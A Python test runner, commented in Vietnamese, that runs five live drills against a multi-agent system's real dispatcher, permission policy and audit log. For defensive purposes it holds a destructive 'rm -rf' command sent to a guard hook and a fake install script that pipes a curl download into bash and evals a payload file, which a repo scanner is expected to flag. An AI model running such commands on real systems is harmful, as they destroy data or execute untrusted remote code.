#!/usr/bin/env python3
"""Năm bài DIỄN TẬP SỐNG — dây chuyền thật, sổ thật, bằng chứng thật.

    python3 tests/drills/run.py --liet-ke     # xem có bài nào, tốn gì
    python3 tests/drills/run.py               # chạy các bài KHÔNG tốn gì
    python3 tests/drills/run.py --only deny   # một bài
    python3 tests/drills/run.py --ton-quota   # thêm bài có gọi model

═══════════════════════════════════════════════════════════════════════
VÌ SAO CẦN MỘT LOẠI CA THỬ NỮA, KHI ĐÃ CÓ 290 CA
═══════════════════════════════════════════════════════════════════════

Ngày 2026-09-20 có bốn chỗ hỏng THẬT mà cả ba bộ kiểm đều xanh suốt:

  · `poller.GATEWAY` trỏ vào file chưa từng tồn tại → MỌI tin nhắn của admin
    ra "Hệ gặp lỗi khi xử lý", và không ai biết vì admin chưa nhắn lần nào;
  · `session.py` tự gọi lại mình qua tên cũ, `Popen` nuốt cả stderr → "Bức
    tranh hiện tại" không bao giờ được làm mới, im lặng tuyệt đối;
  · `codemap` tìm ca thử ở thư mục cũ, có `isfile()` bao ngoài → hàng rào TỰ
    TẮT mà vẫn in "SOÁT LUẬT: sạch";
  · thợ hỏi "có việc không?" bằng lệnh GHI → 294 thẻ duyệt một ngày.

Bài học chung, và nó là lý do file này tồn tại:

    **Ca thử xanh chỉ chứng minh thứ NÓ chạy qua.
      Nó không chứng minh đường THẬT có chạy.**

`regression/` kiểm từng mảnh bằng hàm thuần. `integration/` đi hết dây chuyền
nhưng bằng company giả. Cả hai đều đúng việc của chúng, và cả hai đều KHÔNG
trả lời được câu: *"hệ có làm được việc của nó với người dùng thật không?"*

Năm bài dưới đây trả lời đúng câu đó. Mỗi bài:

  1. đi qua ĐÚNG dispatcher thật, ĐÚNG policy thật, ĐÚNG sổ thật;
  2. kết luận bằng BẰNG CHỨNG ĐỌC TỪ SỔ, không bằng giá trị hàm trả về —
     "company nói ok" và "sổ ghi lại được điều đó" là hai câu khác nhau;
  3. nói rõ nó TỐN GÌ trước khi chạy.

═══ LUẬT CỦA FILE NÀY ═══

  · Không bài nào được sửa dữ liệu thật của admin. Bài có tác động thì chạy
    trên company nội bộ, hoặc trên thư mục tạm.
  · Không bài nào đụng `handoff_panharmon` — CLAUDE.md cấm, và nhánh `main`
    ở đó chỉ admin được ghi (R2).
  · Nhãn trace `drl_` để tách khỏi lưu lượng thật. Bộ đo không được làm bẩn
    thứ nó đo (tiền lệ `evl_`, `reg_`).
"""
import argparse
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import uuid

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(HERE))
sys.path.insert(0, REPO_ROOT)

from core.contracts import ActionKind, Environment, ResourceKind  # noqa: E402
from core.lab.acquisition import inspectRepository  # noqa: E402
from core.permissions import loadEmployees  # noqa: E402

STORE = os.path.join(REPO_ROOT, "backOffice", "store.sqlite")
DISPATCH = os.path.join(REPO_ROOT, "gateway", "cli", "dispatch.py")

#: Nhãn riêng cho diễn tập.
#:
#: ⚠ LẤY TỪ `core.audit.TEST_TRACE_PREFIXES`, KHÔNG gõ lại chuỗi ở đây.
#:
#: Bản đầu viết thẳng `TRACE_PREFIX = "drl_"` mà quên thêm `drl_` vào danh
#: sách chung. Hậu quả đo được ngay tối 20/09: bài `hong` cố ý làm
#: `failOnPurpose` hỏng bốn kiểu, event bus (nối cùng ngày) thấy chúng trong
#: `taskLog`, tưởng là sự cố THẬT, và nhắn admin:
#:
#:     "Em thấy mấy chuyện này, chưa làm gì cả:
#:      · travisSelfTestCompany.failOnPurpose hỏng — báo admin, chờ admin quyết
#:      · … còn 3 việc nữa"
#:
#: Tức là bộ đo tự báo động về chính nó. Đúng cái bẫy đã ghi hai lần trong
#: bảng ("bộ đo tự kiếm quyền", "bộ đo làm hỏng chính phép đo") — và vẫn dính,
#: vì phát minh ra một nhãn MỚI thì không có gì bắt phải đăng ký nó.
#:
#: Nên nhãn lấy TỪ danh sách chung. Thêm một bộ đo mới mà quên đăng ký thì
#: `DRILL_PREFIX` không tồn tại và file này gãy ngay lúc nạp — ồn ào ở bàn
#: làm việc, thay vì im lặng lúc 22 giờ trên máy admin.
from core.audit import TEST_TRACE_PREFIXES  # noqa: E402

DRILL_PREFIX = "drl_"
assert DRILL_PREFIX in TEST_TRACE_PREFIXES, (
    f"`{DRILL_PREFIX}` chưa có trong core.audit.TEST_TRACE_PREFIXES. "
    "Chưa đăng ký thì mọi thứ bộ diễn tập đẻ ra sẽ bị đếm như việc THẬT: "
    "event bus nhắn admin, mức tự chủ leo thang, sổ secret lấp đầy.")
TRACE_PREFIX = DRILL_PREFIX
RUN_TOKEN = uuid.uuid4().hex[:8]


# ══════════════════════════ tiện ích ══════════════════════════

class KetQua:
    """Một bài diễn tập: đạt hay không, và VÌ SAO đọc được."""

    def __init__(self, ten: str):
        self.ten = ten
        self.buoc = []
        self.hong = []

    def dung(self, mo_ta: str, bang_chung: str = ""):
        self.buoc.append(("✓", mo_ta, bang_chung))

    def sai(self, mo_ta: str, bang_chung: str = ""):
        self.buoc.append(("✗", mo_ta, bang_chung))
        self.hong.append(mo_ta)

    def doi(self, dieu_kien: bool, mo_ta: str, bang_chung: str = ""):
        (self.dung if dieu_kien else self.sai)(mo_ta, bang_chung)
        return dieu_kien

    @property
    def dat(self) -> bool:
        return not self.hong

    def in_ra(self):
        dau = "ĐẠT" if self.dat else "TRƯỢT"
        print(f"\n── {self.ten} · {dau} ──")
        for ky_hieu, mo_ta, bang_chung in self.buoc:
            print(f"  {ky_hieu} {mo_ta}")
            if bang_chung:
                for dong in str(bang_chung).splitlines():
                    print(f"      {dong}")


def goi_dispatch(company: str, capability: str, payload: dict, *them,
                 hau_to: str = "") -> dict:
    """Gọi ĐÚNG cổng thật. Không có cờ nào chỉ dành cho diễn tập."""
    trace = f"{TRACE_PREFIX}{RUN_TOKEN}_{capability}{hau_to}"
    argv = [sys.executable, DISPATCH, "call",
            "--company", company, "--capability", capability,
            "--input", json.dumps(payload, ensure_ascii=False),
            "--trace", trace, *them]
    proc = subprocess.run(argv, capture_output=True, text=True,
                          cwd=REPO_ROOT, timeout=300)
    try:
        return json.loads(proc.stdout)
    except json.JSONDecodeError:
        return {"status": "khongDocDuoc",
                "summary": (proc.stderr or proc.stdout).strip()[-600:]}


def dong_so(task_id: str) -> dict:
    conn = sqlite3.connect(STORE)
    conn.row_factory = sqlite3.Row
    try:
        row = conn.execute("SELECT * FROM taskLog WHERE taskId = ?",
                           (task_id,)).fetchone()
        return dict(row) if row else {}
    finally:
        conn.close()


def don_dep():
    """Xoá dấu vết của LƯỢT CHẠY NÀY. Chỉ nhãn `drl_` + token của lượt.

    Phép xoá sống ở module SỞ HỮU bảng (`core.policy.approvals`). Trước 21/09
    cùng câu SQL có BỐN thân, và chúng đã lệch nhau rồi: hai bản trả
    `rowcount`, hai bản trả `None`; hai bản khoá theo token của lượt chạy,
    hai bản xoá cả những lượt song song.
    """
    sys.path.insert(0, os.path.join(REPO_ROOT, "core", "policy"))
    import approvals
    return approvals.xoa_phieu_theo_trace(f"{TRACE_PREFIX}{RUN_TOKEN}%")


# ══════════════════════════ BÀI 1 ══════════════════════════

def bai_tu_chu_an_toan() -> KetQua:
    """Việc ĐỌC đi thẳng, không hỏi ai — nhưng vẫn để lại bằng chứng.

    Đây là "safe autonomy": hệ được phép tự làm thứ không đổi gì của admin.
    Cái đáng kiểm không phải "nó chạy được", mà là BA thứ cùng lúc:
    không hỏi duyệt · có người chịu trách nhiệm · có bằng chứng trong sổ.

    Thiếu thứ ba thì "tự chủ" chỉ là một lời gọi không ai nhìn.
    """
    kq = KetQua("1 · Tự chủ an toàn — đọc thì đi thẳng, nhưng phải có dấu vết")
    res = goi_dispatch("nhacCompany", "dsNhac", {})

    if not kq.doi(res.get("status") == "ok", "lời gọi ĐỌC chạy xong",
                  f"status={res.get('status')} · {str(res.get('summary'))[:90]}"):
        return kq

    row = dong_so(res["taskId"])
    kq.doi(bool(row), "sổ có dòng cho lời gọi này", f"taskId={res.get('taskId')}")
    kq.doi(row.get("policyDecision") == "allow",
           "Policy cho đi THẲNG, không hỏi admin",
           f"{row.get('policyDecision')} — {row.get('policyReason')}")
    kq.doi(row.get("employeeId") == "ceo",
           "có NGƯỜI chịu trách nhiệm, không phải lời gọi vô danh",
           f"employeeId={row.get('employeeId')}")

    bang_chung = json.loads(row.get("verificationJson") or "{}")
    kq.doi(bang_chung.get("status") == "verified",
           "kết luận đến từ BẰNG CHỨNG, không từ lời tự nhận",
           " · ".join(f"{c.get('name')}={c.get('status')}"
                      for c in bang_chung.get("checks", [])))
    return kq


# ══════════════════════════ BÀI 2 ══════════════════════════

def bai_sua_code() -> KetQua:
    """Sửa code: được ở dev, KHÔNG được ở nhánh bảo vệ, KHÔNG được deploy.

    ⚠ Bài này CỐ Ý không chạm vào `handoff_panharmon`. CLAUDE.md cấm đụng kho
    đó, và R2 nói nhánh `main` ở đó chỉ admin được ghi. Một bài diễn tập mà
    phải phá luật mới chạy được thì nó đang đo sai thứ.

    Nên nó đo đúng phần có thể đo mà không đụng gì: **cánh cửa quyền**. Đó
    cũng là phần duy nhất quyết định — nếu cửa mở sai thì mọi thứ sau đó là
    hậu quả, còn nếu cửa đóng đúng thì không có gì sau đó cả.
    """
    kq = KetQua("2 · Sửa code — đúng người, đúng môi trường, đúng nhánh")
    nhan_su = loadEmployees()
    forge = nhan_su.get("forge")
    if not kq.doi(forge is not None, "có employee `forge`"):
        return kq

    kq.doi(forge.mayDo(ResourceKind.repository, ActionKind.modify,
                       environment=Environment.dev, branch="feature/x"),
           "forge SỬA được repo ở môi trường dev, nhánh phụ")
    kq.doi(not forge.mayDo(ResourceKind.repository, ActionKind.modify,
                           environment=Environment.dev, branch="main"),
           "forge KHÔNG đụng được nhánh `main` (R2 — main là của admin)")
    kq.doi(not forge.mayDo(ResourceKind.repository, ActionKind.modify,
                           environment=Environment.production),
           "forge KHÔNG sửa được production")
    kq.doi(not forge.mayDo(ResourceKind.production, ActionKind.deploy),
           "forge KHÔNG deploy được")
    kq.doi(not forge.mayDo(ResourceKind.secret, ActionKind.read),
           "forge KHÔNG đọc được secret (P4)")

    # Nhánh bảo vệ phải lấy từ HỒ SƠ DỰ ÁN, không viết cứng trong ca thử.
    import yaml
    with open(os.path.join(REPO_ROOT, "projects", "panharmon.yaml"),
              encoding="utf-8") as fh:
        du_an = yaml.safe_load(fh) or {}
    kq.doi(du_an.get("nhanhBaoVe") == "main",
           "hồ sơ dự án khai rõ nhánh được bảo vệ",
           f"panharmon.nhanhBaoVe = {du_an.get('nhanhBaoVe')}")

    # `ceo` điều phối. Nó được sửa repo ở `dev` (bài nháp panharmon) nhưng
    # KHÔNG được rộng hơn thợ code — rộng hơn thợ code là dấu hiệu chắc chắn
    # của một quyền khai lỏng.
    ceo = nhan_su["ceo"]
    kq.doi(ceo.mayDo(ResourceKind.repository, ActionKind.modify,
                     environment=Environment.dev),
           "ceo sửa được repo ở `dev` (bài nháp)")
    kq.doi(not ceo.mayDo(ResourceKind.repository, ActionKind.modify,
                         environment=Environment.production),
           "ceo KHÔNG sửa được repo production")

    # ⚠ Bước quyết định: môi trường phải TỚI ĐƯỢC cổng.
    #
    # Bản cũ của dispatcher gọi `mayDo(resource, action)` không truyền
    # `environment`, nên chiều ấy khai trong mọi hồ sơ mà chưa từng có hiệu
    # lực. Đo 20/09 bằng chính bài này: `forge` bị cấm sửa code (quyền CÓ
    # phạm vi thành vô dụng) còn `ceo` mở tới tận production (quyền KHÔNG
    # phạm vi thành vô hạn). Hỏng cả hai chiều cùng một lúc.
    kq.doi("environment=" in _nguonDispatch(),
           "dispatcher TRUYỀN environment vào cổng quyền",
           "nếu không thì mọi `environment:` trong employee.yaml là chữ chết")
    return kq


def _nguonDispatch() -> str:
    with open(DISPATCH, encoding="utf-8") as fh:
        noi_dung = fh.read()
    # Chỉ lấy đoạn quanh lời gọi `mayDo` — soát cả file thì trúng chữ ở
    # chú thích và ca thử tự xanh bằng một bình luận.
    viTri = noi_dung.find("employee.mayDo(")
    return noi_dung[viTri:viTri + 120] if viTri >= 0 else ""


# ══════════════════════════ BÀI 3 ══════════════════════════

def bai_viec_nguy_hiem() -> KetQua:
    """Việc nguy hiểm phải bị CHẶN, và không có đường vòng.

    Đây là bài quan trọng nhất trong năm bài. Bốn cửa phải đóng cùng lúc, và
    **mỗi cửa đóng vì một lý do khác nhau** — đó mới là phòng thủ nhiều lớp,
    chứ không phải một hàng rào vẽ bốn lần.
    """
    kq = KetQua("3 · Việc nguy hiểm — chặn ở nhiều tầng, mỗi tầng một lý do")

    # Cửa 1 — company không tồn tại thì không có gì để bàn (C2.1).
    res = goi_dispatch("productionDatabase", "dropAll", {}, hau_to="_c21")
    kq.doi(res.get("status") == "rejected",
           "C2.1 — company bịa ra bị chặn ở cổng vào",
           str(res.get("summary"))[:100])

    # Cửa 2 — năng lực không khai thì không gọi được (C2.2).
    # ten-sai-co-y: `dropDatabase` KHÔNG tồn tại, và đó là cả điểm của bước
    # này — bài diễn tập phải gọi một cái tên bịa để chứng minh cổng chặn nó.
    res = goi_dispatch("expenseCompany", "dropDatabase", {}, hau_to="_c22")
    kq.doi(res.get("status") == "rejected",
           "C2.2 — năng lực không có trong manifest bị chặn",
           str(res.get("summary"))[:100])

    # Cửa 3 — `sage` đọc chữ từ trang lạ, nên nó KHÔNG được chạm sổ admin.
    res = goi_dispatch("expenseCompany", "listExpenses", {},
                       "--employee", "sage", hau_to="_sage")
    kq.doi(res.get("status") == "denied",
           "E-2 — `sage` không đọc nổi sổ admin, dù chỉ là ĐỌC",
           str(res.get("summary"))[:100])

    # Cửa 4 — cron chỉ được ĐỌC, không có whitelist nào nâng được (S3).
    res = goi_dispatch("expenseCompany", "addExpense",
                       {"soTien": 1000, "danhMuc": "khác", "ghiChu": "diễn tập"},
                       "--issued-by", "scheduledTrigger", hau_to="_cron")
    # Chặn ở cổng EMPLOYEE (`scheduler` chỉ đọc) — trước Policy — nên mã là
    # `denied`. Hai lớp cùng nói không; cái đáng đòi là câu trả lời vẫn NÓI
    # RÕ vì sao cron bị cấm, chứ không phải một mã trạng thái cụ thể.
    kq.doi(res.get("status") in ("rejected", "denied")
           and "S3" in str(res.get("summary")),
           "S3 — cron KHÔNG ghi được, và câu từ chối nói rõ vì sao",
           str(res.get("summary"))[:130])

    # Cửa 5 — `guard.py` chặn CEO dùng Bash cho việc khác dispatcher.
    guard = os.path.join(REPO_ROOT, "ceo", "hooks", "guard.py")
    proc = subprocess.run(
        [sys.executable, guard],
        input=json.dumps({"tool_name": "Bash",
                          "tool_input": {"command": "rm -rf ~/companySpec"}}),
        capture_output=True, text=True, cwd=REPO_ROOT, timeout=60)
    chan = ("deny" in (proc.stdout + proc.stderr).lower()
            or proc.returncode != 0)
    kq.doi(chan, "guard — CEO không chạy được lệnh Bash ngoài dispatcher",
           (proc.stdout or proc.stderr).strip()[:140])

    # ĐỐI CHỨNG — không có bước này thì một hệ chặn sạch mọi thứ cũng "đạt".
    #
    # ⚠ Bản đầu trỏ vào `expenseCompany.addExpense` với `danhMuc: "khác"` —
    # tức là SỔ CHI TIÊU THẬT của admin. Ngày 21/09 nó tự chạy thật: sang
    # ngày mới, trần whitelist 20/ngày reset, quyền đứng khớp, và lời gọi đi
    # thẳng. Nó chỉ không ghi được vì shell thiếu `NOTION_TOKEN` — thoát nhờ
    # MAY, đúng dòng "ca thử tự chạy thật việc GHI" trong bảng bẫy.
    #
    # Nay dùng company NỘI BỘ: tác động tối đa là một dòng trong sqlite của
    # chính nó, không Notion, không ví.
    #
    # Và đòi "KHÔNG bị chặn" chứ không đòi đúng `needsApproval`: một quyền
    # đứng admin đã cấp cũng là một câu "không chặn" hợp lệ. Trói vào một mã
    # duy nhất là để bài diễn tập đỏ mỗi khi admin bấm "luôn cho phép".
    res = goi_dispatch("travisSelfTestCompany", "recordWriteAuto",
                       {"label": "beta", "value": "đối chứng diễn tập"},
                       "--allow-internal", hau_to="_hoi")
    kq.doi(res.get("status") not in ("rejected", "denied"),
           "đối chứng: việc GHI hợp lệ KHÔNG bị chặn",
           f"{res.get('status')} · {str(res.get('summary'))[:80]}")
    return kq


# ══════════════════════════ BÀI 4 ══════════════════════════

FIXTURE_LICENCE = """MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction.
"""

FIXTURE_SCRIPT = """#!/bin/bash
# Kịch bản cài đặt của một repo lạ — ĐÚNG hình dạng đáng ngờ nhất.
curl -sL https://example.invalid/install.sh | bash
eval "$(cat /tmp/payload)"
"""

FIXTURE_PACKAGE = """{
  "name": "repo-la",
  "version": "1.0.0",
  "scripts": {"postinstall": "node ./scripts/setup.js"},
  "dependencies": {"left-pad": "^1.3.0", "lodash": "^4.17.21"}
}
"""


def bai_tiep_nhan_repo_la() -> KetQua:
    """Repo lạ phải được SOI mà KHÔNG chạy.

    Đây là chỗ P7 sống hay chết: mã từ ngoài là INPUT KHÔNG TIN ĐƯỢC. Một
    pipeline tiếp nhận mà phải `npm install` mới biết repo có gì thì nó đã
    thua trước khi bắt đầu.

    Dựng một repo giả trong thư mục tạm, cố ý nhét đúng những hình dạng đáng
    ngờ, rồi đòi bộ soi PHẢI tìm ra.
    """
    kq = KetQua("4 · Tiếp nhận repo lạ — soi được mà KHÔNG chạy nó")
    thu_muc = tempfile.mkdtemp(prefix="drillRepo")
    try:
        os.makedirs(os.path.join(thu_muc, "scripts"), exist_ok=True)
        for ten, noi_dung in (
                ("LICENSE", FIXTURE_LICENCE),
                ("package.json", FIXTURE_PACKAGE),
                (os.path.join("scripts", "install.sh"), FIXTURE_SCRIPT)):
            with open(os.path.join(thu_muc, ten), "w", encoding="utf-8") as fh:
                fh.write(noi_dung)

        bao_cao = inspectRepository(thu_muc, source="drill://repo-la")

        kq.doi(bao_cao.licence != "unknown",
               "đọc ra giấy phép", f"{bao_cao.licence} ({bao_cao.licenceClass})")
        kq.doi(len(bao_cao.dependencies) >= 2,
               "liệt kê được phụ thuộc",
               ", ".join(str(d) for d in bao_cao.dependencies[:4]))
        kq.doi(bao_cao.fileCount > 0, "đã soi file nguồn",
               f"{bao_cao.fileCount} file soi · {bao_cao.skippedFileCount} bỏ qua")

        loai = {f.category for f in bao_cao.findings}
        kq.doi(bool(bao_cao.findings), "tìm ra điều đáng nói",
               " · ".join(f"[{f.severity}] {f.category}"
                          for f in bao_cao.findings[:5]))
        kq.doi(bool(loai), "phát hiện được phân LOẠI, không phải một cục chữ",
               ", ".join(sorted(loai)))
        kq.doi(bool(bao_cao.verdict),
               "có kết luận gợi ý (GỢI Ý, không phải quyết định)",
               str(bao_cao.verdict))

        # Điều quan trọng nhất: nó chỉ ĐỌC. Không file nào bị thêm/sửa.
        con_lai = sorted(os.listdir(thu_muc))
        kq.doi(con_lai == ["LICENSE", "package.json", "scripts"],
               "KHÔNG chạy gì của repo — thư mục nguyên vẹn",
               ", ".join(con_lai))
    finally:
        shutil.rmtree(thu_muc, ignore_errors=True)
    return kq


# ══════════════════════════ BÀI 5 ══════════════════════════

def bai_hong_thi_bao_duoc() -> KetQua:
    """Hỏng kiểu gì cũng phải BÁO ĐƯỢC — và KHÔNG tự chạy lại.

    ⚠ Bài này cố ý KHÁC với kỳ vọng thường gặp. Nhiều bản thiết kế đòi hệ
    "phát hiện → tự thử lại → tự sửa". Hệ này **từ chối tự thử lại**, và đó
    là quyết định có chủ ý:

        Tự thử lại khi chưa biết VÌ SAO hỏng là cách biến một lỗi thành một
        vòng lặp.

    Tự sửa là đặc quyền của mức tự chủ 3, và hôm nay chưa năng lực nào đạt
    tới đó. Nên cái phải kiểm là: hỏng có BÁO ĐƯỢC không, có ĐỦ CHI TIẾT để
    lần ra không, và cửa vào có SẬP không (O8).
    """
    kq = KetQua("5 · Hỏng thì báo được — và cố ý KHÔNG tự chạy lại")
    noi_bo = ["--allow-internal"]

    for kieu, mong_doi, y_nghia in (
            ("timeout", "budgetExceeded", "quá giờ → cắt, báo được"),
            ("badOutput", "failed", "sai schema → bắt ở cổng ra"),
            ("crash", "failed", "tiến trình chết → giữ DÒNG CUỐI traceback"),
            ("needsInput", "needsInput", "thiếu dữ kiện ≠ hỏng")):
        res = goi_dispatch("travisSelfTestCompany", "failOnPurpose",
                           {"mode": kieu}, *noi_bo, hau_to=f"_{kieu}")
        kq.doi(res.get("status") == mong_doi, y_nghia,
               f"{kieu} → {res.get('status')} · {str(res.get('summary'))[:80]}")

        if kieu == "crash":
            kq.doi("SelfTestCrash" in str(res.get("summary")),
                   "log cắt từ ĐUÔI — còn dòng nói hỏng vì cái gì",
                   str(res.get("summary"))[-90:])

        row = dong_so(res.get("taskId", ""))
        kq.doi(bool(row) and bool(row.get("policyDecision")),
               f"`{kieu}` vẫn để lại dấu vết có quyết định policy",
               f"policyDecision={row.get('policyDecision')}")

    # Không tự chạy lại: cùng một việc hỏng, gọi lại quá số lần là bị CHẶN.
    for lan in range(3):
        res = goi_dispatch("travisSelfTestCompany", "failOnPurpose",
                           {"mode": "badOutput"}, *noi_bo, hau_to="_lap")
    kq.doi("L4" in str(res.get("summary")) or res.get("status") == "rejected",
           "L4 — lặp lại cùng một lời gọi bị chặn, không thành vòng lặp",
           str(res.get("summary"))[:110])
    return kq


# ══════════════════════════ BÀI 1b (tốn hạn mức) ══════════════════════════

def bai_tra_web_that() -> KetQua:
    """Bản TỐN HẠN MỨC của bài 1: gọi model thật để tra web.

    Chỉ chạy với `--ton-quota`. Nó dùng hạn mức gói Pro — không phải tiền
    thật, nhưng vẫn là thứ có giới hạn, nên không chạy lén.
    """
    kq = KetQua("1b · Tra web thật (TỐN HẠN MỨC) — có gọi model")
    res = goi_dispatch("searchCompany", "traNhanh",
                       {"cauHoi": "hôm nay là thứ mấy"}, hau_to="_web")
    kq.doi(res.get("status") in ("ok", "needsInput"),
           "lời gọi có dùng model chạy xong",
           f"{res.get('status')} · {str(res.get('summary'))[:110]}")
    row = dong_so(res.get("taskId", ""))
    kq.doi(bool(row.get("brainId")) or bool(row.get("costUsd") is not None),
           "sổ ghi lại bộ não và chi phí",
           f"brainId={row.get('brainId')} · costUsd={row.get('costUsd')}")
    return kq


# ══════════════════════════ bộ chạy ══════════════════════════

BAI = [
    ("tuchu", "Tự chủ an toàn — đọc đi thẳng, vẫn có bằng chứng",
     "0đ · không gọi model", bai_tu_chu_an_toan),
    ("suacode", "Sửa code — đúng người, đúng môi trường, đúng nhánh",
     "0đ · không đụng repo nào", bai_sua_code),
    ("deny", "Việc nguy hiểm — chặn nhiều tầng, mỗi tầng một lý do",
     "0đ · không gọi model", bai_viec_nguy_hiem),
    ("tiepnhan", "Tiếp nhận repo lạ — soi được mà KHÔNG chạy",
     "0đ · repo giả trong thư mục tạm", bai_tiep_nhan_repo_la),
    ("hong", "Hỏng thì báo được — và cố ý KHÔNG tự chạy lại",
     "0đ · company nội bộ", bai_hong_thi_bao_duoc),
]

BAI_TON_QUOTA = [
    ("web", "Tra web thật — có gọi model",
     "TỐN HẠN MỨC gói Pro", bai_tra_web_that),
]


def main() -> int:
    ap = argparse.ArgumentParser(description="năm bài diễn tập sống")
    ap.add_argument("--liet-ke", action="store_true",
                    help="xem có bài nào, tốn gì — không chạy")
    ap.add_argument("--only", help="chạy một bài theo mã")
    ap.add_argument("--ton-quota", action="store_true",
                    help="chạy thêm bài có GỌI MODEL (tốn hạn mức)")
    args = ap.parse_args()

    tat_ca = BAI + (BAI_TON_QUOTA if args.ton_quota else [])

    if args.liet_ke:
        print("Các bài diễn tập:\n")
        for ma, mo_ta, gia, _ in BAI + BAI_TON_QUOTA:
            print(f"  {ma:<10} {mo_ta}")
            print(f"  {'':<10} {gia}\n")
        print("Mặc định chạy các bài 0đ. `--ton-quota` để thêm bài gọi model.")
        return 0

    if args.only:
        tat_ca = [b for b in (BAI + BAI_TON_QUOTA) if b[0] == args.only]
        if not tat_ca:
            print(f"Không có bài `{args.only}`. Xem `--liet-ke`.")
            return 2

    print("══ DIỄN TẬP SỐNG ══")
    print(f"   dispatcher thật · sổ thật · nhãn trace `{TRACE_PREFIX}{RUN_TOKEN}`\n")

    bat_dau = time.time()
    ket_qua = []
    for ma, _mo_ta, _gia, ham in tat_ca:
        try:
            kq = ham()
        except Exception as exc:
            kq = KetQua(f"{ma} · VỠ khi đang chạy")
            kq.sai(f"{type(exc).__name__}: {exc}")
        kq.in_ra()
        ket_qua.append(kq)

    don_dep()

    dat = sum(1 for k in ket_qua if k.dat)
    print(f"\n══ {dat}/{len(ket_qua)} bài ĐẠT · {time.time() - bat_dau:.0f}s ══")
    for k in ket_qua:
        if not k.dat:
            print(f"  TRƯỢT: {k.ten}")
            for h in k.hong:
                print(f"     · {h}")
    return 0 if dat == len(ket_qua) else 1


if __name__ == "__main__":
    raise SystemExit(main())
